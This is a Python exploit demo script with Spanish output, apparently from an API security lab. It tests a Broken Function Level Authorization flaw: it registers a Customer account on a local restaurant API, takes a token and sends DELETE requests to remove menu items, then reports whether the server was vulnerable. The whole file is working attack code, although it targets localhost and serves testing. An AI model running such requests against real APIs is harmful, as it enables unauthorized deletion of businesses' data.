import time
import requests

BASE_URL = "http://localhost:8091"

TEST_USER = {
    "username": "test_video_fn_2",
    "password": "attacker123",
    "phone_number": "56565566462",
    "first_name": "Menu",
    "last_name": "Attacker"
}

TARGET_MENU_ID = 4 #Cambiar para otra prueba

def slow_print(msg, delay=0.5):
    print(msg)
    time.sleep(delay)

def separator(title=""):
    print("\n" + "="*70)
    if title:
        print(f"  {title}")
        print("="*70)
    print()

def register_user(user_data):
    slow_print(f"ğŸ“ Registrando: {user_data['username']}", 0.3)
    
    payload = {
        "username": user_data["username"],
        "password": user_data["password"],
        "phone_number": user_data["phone_number"],
        "first_name": user_data["first_name"],
        "last_name": user_data["last_name"]
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        
        if r.status_code == 200 or r.status_code == 201:
            slow_print(f"âœ… Usuario creado (rol: Customer por defecto)\n", 0.3)
            return True
        else:
            slow_print(f"âš ï¸  Error: {r.status_code}\n", 0.3)
            return False
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return False

def get_token(username, password):
    slow_print(f"ğŸ”‘ Obteniendo token: {username}", 0.3)
    
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/token",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if r.status_code == 200:
            token_data = r.json()
            token = token_data.get("access_token")
            slow_print(f"âœ… Token obtenido\n", 0.3)
            return token
        else:
            slow_print(f"âŒ Error: {r.status_code}\n", 0.3)
            return None
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return None

def get_menu_items(token=None):
    slow_print(f"ğŸ“‹ Consultando menÃº disponible...", 0.3)
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    try:
        r = requests.get(f"{BASE_URL}/menu", headers=headers)
        
        if r.status_code == 200:
            items = r.json()
            slow_print(f"âœ… Items disponibles: {len(items)}\n", 0.3)
            return items
        else:
            slow_print(f"âŒ Error [{r.status_code}]: {r.text}\n", 0.3)
            return []
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return []

def delete_menu_item(token, menu_id):
    slow_print(f"ğŸ—‘ï¸  Intentando eliminar item de menÃº ID={menu_id}...", 0.5)
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        r = requests.delete(
            f"{BASE_URL}/menu/{menu_id}",
            headers=headers
        )
        
        slow_print(f"\nğŸ“¡ Respuesta [{r.status_code}]", 0.3)
        
        if r.status_code == 204:
            slow_print(f"âœ… Item eliminado exitosamente", 0.3)
            slow_print(f"   El servidor confirmÃ³ la eliminaciÃ³n\n", 0.3)
            return True
        elif r.status_code == 403:
            slow_print(f"ğŸ›¡ï¸  Acceso denegado (protegido)", 0.3)
            slow_print(f"   Detalle: {r.text}\n", 0.3)
            return False
        elif r.status_code == 404:
            slow_print(f"âš ï¸  Item no encontrado", 0.3)
            slow_print(f"   El item ya no existe o ID invÃ¡lido\n", 0.3)
            return None
        else:
            slow_print(f"âš ï¸  Respuesta inesperada: {r.text}\n", 0.3)
            return False
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return False

def main():
    separator("ğŸš¨ EXPLOIT LEVEL 1 - BROKEN FUNCTION LEVEL AUTHORIZATION")
    
    slow_print("ğŸ“‹ Vulnerabilidad a explotar:")
    slow_print("   API5:2023 - Broken Function Level Authorization (BFLA)")
    slow_print("   â†’ Usuario Customer puede eliminar items del menÃº")
    slow_print("   â†’ Solo Employee/Chef deberÃ­an tener este privilegio\n")
    
    separator("PASO 1: Crear usuario Customer")
    
    slow_print("ğŸ‘¤ Creando usuario con rol Customer (por defecto)...\n")
    
    if not register_user(TEST_USER):
        slow_print("âŒ No se pudo crear usuario. Abortando...\n")
        return
    
    separator("PASO 2: AutenticaciÃ³n")
    
    token = get_token(TEST_USER["username"], TEST_USER["password"])
    
    if not token:
        slow_print("âŒ No se pudo obtener token. Abortando...\n")
        return
    
    slow_print(f"âœ… Usuario autenticado como: {TEST_USER['username']}")
    slow_print(f"   Rol esperado: Customer")
    slow_print(f"   Permisos esperados: Solo lectura de menÃº\n")
    
    separator("PASO 3: Consultar menÃº inicial")
    
    initial_menu = get_menu_items(token)
    
    if initial_menu:
        slow_print(f"ğŸ“Š MENÃš INICIAL:")
        for idx, item in enumerate(initial_menu[:5], 1):
            slow_print(f"   {idx}. ID={item.get('id')} - {item.get('name')} (${item.get('price', 0)})", 0.2)
        
        if len(initial_menu) > 5:
            slow_print(f"   ... y {len(initial_menu) - 5} items mÃ¡s", 0.2)
        slow_print("")
    
    target_item = None
    current_target_id = TARGET_MENU_ID  # Usar variable local en lugar de la global
    
    for item in initial_menu:
        if item.get('id') == current_target_id:
            target_item = item
            break
    
    if not target_item:
        slow_print(f"âš ï¸  Item ID={current_target_id} no encontrado en el menÃº")
        slow_print(f"   Usando el primer item disponible para el test...\n")
        if initial_menu:
            target_item = initial_menu[0]
            current_target_id = target_item.get('id')  # Actualizar la variable local
    
    if target_item:
        slow_print(f"ğŸ¯ ITEM OBJETIVO:")
        slow_print(f"   ID: {target_item.get('id')}")
        slow_print(f"   Nombre: {target_item.get('name')}")
        slow_print(f"   Precio: ${target_item.get('price', 0)}\n")
    
    separator("PASO 4: EXPLOTAR - Eliminar item del menÃº")
    
    slow_print("âš ï¸  ATAQUE: Usuario Customer intenta funciÃ³n administrativa")
    slow_print(f"   Endpoint: DELETE /menu/{current_target_id}")
    slow_print(f"   AcciÃ³n: Eliminar item del menÃº")
    slow_print(f"   AutorizaciÃ³n requerida: Employee/Chef")
    slow_print(f"   AutorizaciÃ³n actual: Customer\n")
    
    deletion_successful = delete_menu_item(token, current_target_id)
    
    separator("PASO 5: Verificar resultado del ataque")
    
    slow_print("ğŸ” Consultando menÃº nuevamente para verificar...\n")
    
    final_menu = get_menu_items(token)
    
    item_still_exists = False
    for item in final_menu:
        if item.get('id') == current_target_id:
            item_still_exists = True
            break
    
    separator("ğŸ“Š ANÃLISIS DE VULNERABILIDAD")
    
    print("\n" + "="*70)
    
    if deletion_successful and not item_still_exists:
        print("ğŸš¨ğŸš¨ğŸš¨ VULNERABILIDAD CONFIRMADA ğŸš¨ğŸš¨ğŸš¨")
        print("="*70)
        slow_print("\n   âŒ FALLO DE AUTORIZACIÃ“N CRÃTICO:")
        slow_print(f"   âŒ Usuario Customer eliminÃ³ item ID={current_target_id} del menÃº")
        slow_print(f"   âŒ NO se validÃ³ el rol del usuario")
        slow_print(f"   âŒ FunciÃ³n administrativa accesible sin privilegios\n")
        
        slow_print(f"   ğŸ“Š EVIDENCIA:")
        slow_print(f"      â€¢ Items iniciales: {len(initial_menu)}")
        slow_print(f"      â€¢ Items finales: {len(final_menu)}")
        slow_print(f"      â€¢ Items eliminados: {len(initial_menu) - len(final_menu)}")
        slow_print(f"      â€¢ Status HTTP: 204 No Content (exitoso)\n")
        
        slow_print(f"   ğŸ’¸ IMPACTO:")
        slow_print(f"      â€¢ Cualquier customer puede sabotear el menÃº")
        slow_print(f"      â€¢ EliminaciÃ³n masiva de productos")
        slow_print(f"      â€¢ PÃ©rdida de ventas y disponibilidad")
        slow_print(f"      â€¢ DaÃ±o a operaciones del negocio\n")
        
        slow_print(f"   ğŸ” VECTOR DE ATAQUE:")
        slow_print(f"      1. Crear cuenta como Customer")
        slow_print(f"      2. Obtener listado de IDs del menÃº")
        slow_print(f"      3. Eliminar items uno por uno (o en batch)")
        slow_print(f"      4. Dejar el menÃº vacÃ­o o saboteado\n")
        
    elif deletion_successful is False:
        print("âœ… API PROTEGIDA CORRECTAMENTE")
        print("="*70)
        slow_print(f"\n   âœ… Se validÃ³ el rol del usuario correctamente")
        slow_print(f"   âœ… Customer NO puede eliminar items del menÃº")
        slow_print(f"   âœ… Solo Employee/Chef tienen acceso a esta funciÃ³n\n")
        
    elif deletion_successful is None:
        print("âš ï¸  RESULTADO INDETERMINADO")
        print("="*70)
        slow_print(f"\n   âš ï¸  Item no encontrado (puede estar ya eliminado)")
        slow_print(f"   â„¹ï¸  Ejecute el script nuevamente con un ID vÃ¡lido\n")
    
    separator("âœ… FIN DEL EXPLOIT LEVEL 1")
    
    slow_print(f"ğŸ’¡ Usuario atacante: {TEST_USER['username']} (Customer)")
    slow_print(f"ğŸ’¡ Item objetivo: ID={current_target_id}")
    slow_print(f"ğŸ’¡ Resultado: {'VULNERABLE' if deletion_successful else 'PROTEGIDO'}\n")

if __name__ == "__main__":
    main()